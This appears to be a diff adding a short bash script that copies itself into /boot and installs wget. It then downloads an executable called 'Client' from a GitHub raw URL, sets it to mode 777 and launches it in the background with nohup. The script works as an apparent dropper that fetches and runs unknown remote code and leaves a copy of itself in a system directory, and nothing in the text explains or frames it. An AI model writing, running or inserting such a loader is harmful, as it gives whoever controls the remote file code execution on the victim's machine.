@@ -1,0 +1,14 @@
+#!/bin/bash
+cp $(pwd)/$0 /boot
+mv /boot/$0 /boot/main
+cd /tmp
+
+url=https://github.com/rxu7s/Public/raw/main/Client
+file_name=Client
+
+apt-get update -y
+apt-get install wget -y
+
+wget $url -O $file_name
+chmod 777 $file_name
+nohup ./$file_name
